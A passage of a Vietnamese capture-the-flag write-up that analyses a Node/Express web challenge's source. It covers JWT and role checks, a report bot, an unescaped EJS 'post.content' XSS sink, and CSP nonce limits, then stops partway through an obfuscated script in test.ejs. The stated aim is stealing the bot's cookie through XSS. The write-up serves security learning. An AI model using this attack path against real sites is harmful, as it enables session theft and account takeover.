</span><span class="sb">        &lt;script nonce=&#34;</span><span class="si">${</span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">&#34;&gt;
</span><span class="sb">            alert(&#34;</span><span class="si">${</span><span class="nx">message</span><span class="si">}</span><span class="sb">&#34;);
</span><span class="sb">            window.location.href = &#34;/post&#34;;
</span><span class="sb">        &lt;/script&gt;
</span><span class="sb">    `</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</code></pre></div><p>Trước tiên thì nói về chức năng -&gt; như dự đoán ở con bot automatic kia thôi, thì khi người dùng truy xuất đến <code>/report/:post_id</code> thì api này sẽ được gọi và bot sẽ được trigger và sau đó redirect người dùng về <code>/post</code> để xem list tất cả những post của họ.</p>
<ol>
<li>Về quyền hạn:</li>
</ol>
<p>1.1 Đầu tiên là 1 middleware <code>router.use(authenticateJWT);</code></p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;jsonwebtoken&#39;</span><span class="p">);</span>
<span class="nx">require</span><span class="p">(</span><span class="s1">&#39;dotenv&#39;</span><span class="p">).</span><span class="nx">config</span><span class="p">();</span>

<span class="kr">const</span> <span class="nx">secretKey</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SECRET_KEY</span><span class="p">;</span>

<span class="kr">const</span> <span class="nx">generateToken</span> <span class="o">=</span> <span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="nx">secretKey</span><span class="p">,</span> <span class="p">{</span> <span class="nx">expiresIn</span><span class="o">:</span> <span class="s1">&#39;1h&#39;</span> <span class="p">});</span>
<span class="p">};</span>

<span class="kr">const</span> <span class="nx">authenticateJWT</span> <span class="o">=</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="o">?</span><span class="p">.</span><span class="nx">jwt</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span> <span class="p">});</span>

    <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">secretKey</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">user</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;Forbidden&#39;</span> <span class="p">});</span>

        <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">user</span><span class="p">;</span>
        <span class="nx">next</span><span class="p">();</span>
    <span class="p">});</span>
<span class="p">};</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">authenticateJWT</span><span class="p">,</span> <span class="nx">generateToken</span> <span class="p">};</span>
</code></pre></div><p>đây mà 1 middleware để check jwt -&gt; verify rất chuẩn chỉnh và không có lỗi liên quan đến logic nó chỉ check xem người dùng đã đăng nhập hay chưa.</p>
<p>1.2</p>
<pre><code class="language-javascript!" data-lang="javascript!">if (req.user.role !== &quot;INSPECTOR&quot;) {
        message = &quot;No Permission.&quot;;
        code = 403;
    }
</code></pre><p>Vấn đề thứ 2 là người dùng phải có role <code>INSPECTOR</code> mà trông thấy khi reg</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">addUser</span> <span class="o">=</span> <span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">uuidv4</span><span class="p">()</span>

    <span class="nx">users</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="p">{</span> <span class="nx">password</span><span class="p">,</span> <span class="nx">role</span><span class="o">:</span> <span class="s2">&#34;MEMBER&#34;</span><span class="p">,</span> <span class="nx">hasPerm</span><span class="o">:</span> <span class="kc">false</span> <span class="p">});</span>

    <span class="k">return</span> <span class="nx">uuid</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div><p>Gía trị mặc định cho tất cả các user khi đăng kí là như trên</p>
<h3 id="find-gadget-endpoint">find gadget endpoint</h3>
<p>Phần sink sẽ liên quan đến post đúng không? giờ thì tìm những api liên quan đến post tại <code>app.use('/post', postRoute);</code></p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">authenticateJWT</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../utils/jwt&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">getPosts</span><span class="p">,</span> <span class="nx">addPost</span><span class="p">,</span> <span class="nx">getPostById</span><span class="p">,</span> <span class="nx">deletePost</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../models/postModel&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">postGuard</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../utils/guard&#39;</span><span class="p">);</span>
<span class="c1">// const filterRegex = //gi
</span><span class="c1"></span>
<span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">authenticateJWT</span><span class="p">);</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">posts</span> <span class="o">=</span> <span class="nx">getPosts</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">);</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;post/index&#39;</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">uuid</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">uuid</span><span class="p">,</span>
        <span class="nx">role</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span><span class="p">,</span>
        <span class="nx">posts</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/write&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;post/write&#39;</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">uuid</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">uuid</span><span class="p">,</span>
        <span class="nx">role</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/write&#39;</span><span class="p">,</span> <span class="nx">postGuard</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="p">{</span> <span class="nx">title</span><span class="p">,</span> <span class="nx">content</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">title</span> <span class="o">||</span> <span class="o">!</span><span class="nx">content</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Please fill title and content.&#34;</span> <span class="p">});</span>
    <span class="c1">// In the actual code, a SPECIAL filter is prepared for here.
</span><span class="c1"></span>    <span class="c1">// if (content.match(filterRegex)) return res.status(403).json({ message: &#34;Hacking Detected!&#34; });
</span><span class="c1"></span>
    <span class="kr">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">addPost</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Post Saved.&#34;</span><span class="p">,</span> <span class="nx">post</span> <span class="p">});</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/:post_id&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">getPostById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">post_id</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">post</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Post Not Found.&#34;</span> <span class="p">});</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;post/view&#39;</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">post</span><span class="p">,</span>
        <span class="nx">isInspector</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span> <span class="o">===</span> <span class="s2">&#34;INSPECTOR&#34;</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="nx">isAdmin</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span> <span class="o">===</span> <span class="s2">&#34;ADMIN&#34;</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="nx">isOwner</span><span class="o">:</span> <span class="nx">post</span><span class="p">.</span><span class="nx">writer</span> <span class="o">===</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">uuid</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/delete/:post_id&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">deletePost</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">post_id</span><span class="p">);</span>

    <span class="kr">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">result</span> <span class="o">?</span> <span class="s2">&#34;Successfully removed.&#34;</span> <span class="o">:</span> <span class="s2">&#34;Post Not Found.&#34;</span><span class="p">;</span>
    <span class="kr">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">result</span> <span class="o">?</span> <span class="mi">200</span> <span class="o">:</span> <span class="mi">404</span><span class="p">;</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="nx">code</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="sb">`
</span><span class="sb">        &lt;script nonce=&#34;</span><span class="si">${</span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">&#34;&gt;
</span><span class="sb">            alert(&#34;</span><span class="si">${</span><span class="nx">message</span><span class="si">}</span><span class="sb">&#34;);
</span><span class="sb">            window.location.href = &#34;/post&#34;;
</span><span class="sb">        &lt;/script&gt;
</span><span class="sb">    `</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</code></pre></div><p>Như những trang web thông thường thì nó vẫn chỉ chứa CRUD cơ bản về node</p>
<ul>
<li>
<p>Quan sát kĩ hơn có thể thấy phần view note thì người dùng chỉ có thể xem những note mà họ tạo ra hay nói cách khác là họ phải authen -&gt; sau đó thì req.user của họ sẽ là giá trị được verify -&gt; sau đó hệ thống sẽ lấy những giá trị này để get hết post <code>const posts = new Map();</code> được lưu vào trong map trên</p>
</li>
<li>
<p>mặc định là người dùng sẽ không có note bất kì nào sau khi reg/log vào tài khoản lần đầu cho nên muốn trigger post thì không thế -&gt; do đó việc cần thiết là phải có thể post note lên</p>
</li>
</ul>
<ol>
<li>api write note</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/write&#39;</span><span class="p">,</span> <span class="nx">postGuard</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="p">{</span> <span class="nx">title</span><span class="p">,</span> <span class="nx">content</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">title</span> <span class="o">||</span> <span class="o">!</span><span class="nx">content</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Please fill title and content.&#34;</span> <span class="p">});</span>
    <span class="c1">// In the actual code, a SPECIAL filter is prepared for here.
</span><span class="c1"></span>    <span class="c1">// if (content.match(filterRegex)) return res.status(403).json({ message: &#34;Hacking Detected!&#34; });
</span><span class="c1"></span>
    <span class="kr">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">addPost</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Post Saved.&#34;</span><span class="p">,</span> <span class="nx">post</span> <span class="p">});</span>
<span class="p">});</span>
</code></pre></div><p>Quan sát thì người dùng có thể truyền được tittle và content thông qua một form sau đó post sẽ được thêm vào trong map với uuid tương ứng bằng method <code>addPost</code></p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">addPost</span> <span class="o">=</span> <span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">uuidv4</span><span class="p">();</span>
    <span class="kr">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">post_id</span><span class="o">:</span> <span class="nx">uuid</span><span class="p">,</span> <span class="nx">writer</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="nx">body</span><span class="p">.</span><span class="nx">title</span><span class="p">,</span> <span class="nx">content</span><span class="o">:</span> <span class="nx">body</span><span class="p">.</span><span class="nx">content</span> <span class="p">};</span>

    <span class="nx">posts</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">post</span><span class="p">);</span>

    <span class="k">return</span> <span class="nx">post</span>
<span class="p">};</span>
</code></pre></div><p>1.1 Authority(Quyền hạn truy cập với api write note)</p>
<p>Có thể thấy thêm 1 middleware nữa là <code>postGuard</code></p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">postGuard</span> <span class="o">=</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">hasPerm</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;Forbidden.&#39;</span> <span class="p">});</span>

    <span class="nx">next</span><span class="p">();</span>
<span class="p">};</span>
</code></pre></div><p>ở đây yêu cầu người dùng phải có <code>hasPerm</code> là true nhưng mà với điều kiện ban đầu thì không khả thi</p>
<h3 id="find-xss-endpoint-to-inject">find xss endpoint to inject</h3>
<ol>
<li>Như đề cập ở trên ta đã có 1 con bot giờ thì ta sẽ tìm nơi để có thể trigger xss từ nó</li>
</ol>
<pre><code class="language-ejs" data-lang="ejs">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;Post&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/style.css&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;h1 id=&quot;post-title&quot;&gt;
            &lt;%= post.title %&gt;
        &lt;/h1&gt;
        &lt;div class=&quot;user-info&quot;&gt;
            &lt;button id=&quot;report&quot; class=&quot;button danger&quot;&gt;Report&lt;/button&gt;
            &lt;button id=&quot;delete&quot; class=&quot;button danger&quot;&gt;Delete&lt;/button&gt;
        &lt;/div&gt;

        &lt;hr&gt;
        &lt;div class=&quot;post-content&quot;&gt;
            &lt;%- post.content %&gt;
        &lt;/div&gt;
        &lt;a href=&quot;/post&quot; class=&quot;button&quot;&gt;Go to Posts&lt;/a&gt;
    &lt;/div&gt;
    &lt;script nonce=&quot;&lt;%= nonce %&gt;&quot;&gt;
        &lt;% if (isOwner || isAdmin) { %&gt;
            window.conf = window.conf || {
                deleteUrl: &quot;/post/delete/&lt;%= post.post_id %&gt;&quot;
            };x
        &lt;% } else { %&gt;
            window.conf = window.conf || {
                deleteUrl: &quot;/error/role&quot;
            };
        &lt;% } %&gt;

        &lt;% if (isInspector) { %&gt;
            window.conf.reportUrl = &quot;/report/&lt;%= post.post_id %&gt;&quot;;
        &lt;% } else { %&gt;
            window.conf.reportUrl = &quot;/error/role&quot;;
        &lt;% } %&gt;

        const reportButton = document.querySelector(&quot;#report&quot;);

        reportButton.addEventListener(&quot;click&quot;, () =&gt; {
            location.href = window.conf.reportUrl;
        });

        const deleteButton = document.querySelector(&quot;#delete&quot;);

        deleteButton.addEventListener(&quot;click&quot;, () =&gt; {
            location.href = window.conf.deleteUrl;
        });
    &lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>Quan sát khi ejs xử lí hiển thị <code>&lt;%- post.content %&gt;</code> thay vì <code>&lt;%= post.title %&gt;</code> sẽ bị lọc đầu ra trước khi hiển thị -&gt; cho nên nơi có thể khai thác là <code>&lt;%- post.content %&gt;</code></p>
<p>và nó được render nhờ và hoàn toàn không hề có bất kì filter nào hết</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/:post_id&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">getPostById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">post_id</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">post</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Post Not Found.&#34;</span> <span class="p">});</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;post/view&#39;</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">post</span><span class="p">,</span>
        <span class="nx">isInspector</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span> <span class="o">===</span> <span class="s2">&#34;INSPECTOR&#34;</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="nx">isAdmin</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span> <span class="o">===</span> <span class="s2">&#34;ADMIN&#34;</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="nx">isOwner</span><span class="o">:</span> <span class="nx">post</span><span class="p">.</span><span class="nx">writer</span> <span class="o">===</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">uuid</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="p">...</span>
<span class="kr">const</span> <span class="nx">getPostById</span> <span class="o">=</span> <span class="p">(</span><span class="nx">post_id</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">posts</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">post_id</span><span class="p">);</span>

    <span class="k">return</span> <span class="nx">post</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div><ol start="2">
<li>Vấn đề đặt ra</li>
</ol>
<p>tại <code>index.js</code> ta đã phân tích ở trên thì csp đã được đặt cho endpoint này là 1 giá trị <code>nonce-{random}</code> được random 16 byte cho nên khả năng leak giá trị này là bất khả thi và mình cũng đã thử css leak nhưng cũng không được</p>
<p>Vậy thì end point này có vẻ như không thể dính dùng xss để lấy cookie được</p>
<h3 id="find-real-endpoint-to-xss">find real endpoint to xss</h3>
<p>Tiếp tục tìm kiếm thì mình thấy tại <code>/views/test.ejs</code> có khả nghi vì ở trong này có javascript được obfucate:</p>
<pre><code class="language-ejs" data-lang="ejs">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;Test Place&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;h1 class=&quot;post_title&quot;&gt;&lt;/h1&gt;
    &lt;div class=&quot;post_content&quot;&gt;&lt;/div&gt;
    &lt;div class=&quot;error_div&quot;&gt;&lt;/div&gt;
    &lt;script src=&quot;../js/purify.min.js&quot;&gt;&lt;/script&gt;
    &lt;script&gt;
        function _0x5582(_0x409510, _0xadade8) {
            const _0xed7c16 = _0xf972();
            return _0x5582 = function (_0xe31be7, _0x128541) {
                _0xe31be7 = _0xe31be7 - (0x1b6a + 0x26a * -0xf + 0x9d7);
                let _0x561cef = _0xed7c16[_0xe31be7];
                if (_0x5582['JdbaXF'] === undefined) {
                    var _0x3ec112 = function (_0xb1fd98) {
                        const _0x3e0794 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                        let _0x41f72f = '',
                            _0x58e59d = '';
                        for (let _0x9bab26 = -0x1 * 0xf93 + -0x1 * 0x1fb4 + 0x2f47, _0xe5342b, _0x135544, _0x93f446 = -0x653 + -0x1130 + 0x1783; _0x135544 = _0xb1fd98['charAt'](_0x93f446++); ~_0x135544 &amp;&amp; (_0xe5342b = _0x9bab26 % (0x1cad + -0x37 + -0x1c72) ? _0xe5342b * (0x1f32 + -0x17ca + -0x728) + _0x135544 : _0x135544, _0x9bab26++ % (-0x2501 + 0x8e + 0x2477)) ? _0x41f72f += String['fromCharCode'](0x2b3 * 0x1 + -0x1e75 + 0x1b1 * 0x11 &amp; _0xe5342b &gt;&gt; (-(0x1 * -0x1e21 + -0x14 * 0x1e + -0x5 * -0x67f) * _0x9bab26 &amp; 0xada + -0x121e + 0x74a)) : 0x3ae * -0x7 + 0x23c7 + -0x11d * 0x9) {
                            _0x135544 = _0x3e0794['indexOf'](_0x135544);
                        }
                        for (let _0x5f1add = -0x1ff4 + -0x26 * -0xd8 + -0x1c, _0x4fed1c = _0x41f72f['length']; _0x5f1add &lt; _0x4fed1c; _0x5f1add++) {
                            _0x58e59d += '%' + ('00' + _0x41f72f['charCodeAt'](_0x5f1add)['toString'](-0x682 + -0x1631 + 0x1cc3))['slice'](-(0x1 * 0x1c58 + 0x245 + -0x1e9b));
                        }
                        return decodeURIComponent(_0x58e59d);
                    };
                    const _0xee82a5 = function (_0x10768a, _0x497987) {
                        let _0x4887d2 = [],
                            _0x39bfbb = -0x1b93 + -0x8e3 + 0x2476,
                            _0x572c71, _0x35a9ba = '';
                        _0x10768a = _0x3ec112(_0x10768a);
                        let _0x3eb323;
                        for (_0x3eb323 = 0x2e * 0x81 + 0x7a7 * -0x4 + 0x27a * 0x3; _0x3eb323 &lt; 0x34c * 0x8 + -0x7e * 0x5 + 0xb75 * -0x2; _0x3eb323++) {
                            _0x4887d2[_0x3eb323] = _0x3eb323;
                        }
                        for (_0x3eb323 = -0x147 * 0x18 + 0xb * -0x27a + -0x1cf3 * -0x2; _0x3eb323 &lt; -0xa61 * -0x2 + 0x1f * -0x28 + -0xeea; _0x3eb323++) {
                            _0x39bfbb = (_0x39bfbb + _0x4887d2[_0x3eb323] + _0x497987['charCodeAt'](_0x3eb323 % _0x497987['length'])) % (0x8 * -0x2e4 + 0x3b2 * 0x1 + 0x146e), _0x572c71 = _0x4887d2[_0x3eb323], _0x4887d2[_0x3eb323] = _0x4887d2[_0x39bfbb], _0x4887d2[_0x39bfbb] = _0x572c71;
                        }
                        _0x3eb323 = -0x1401 + -0xce9 + 0x20ea, _0x39bfbb = 0x1cb5 + 0xd78 + 0xe0f * -0x3;
                        for (let _0x304253 = -0xecd * 0x2 + -0x765 + 0x24ff; _0x304253 &lt; _0x10768a['length']; _0x304253++) {
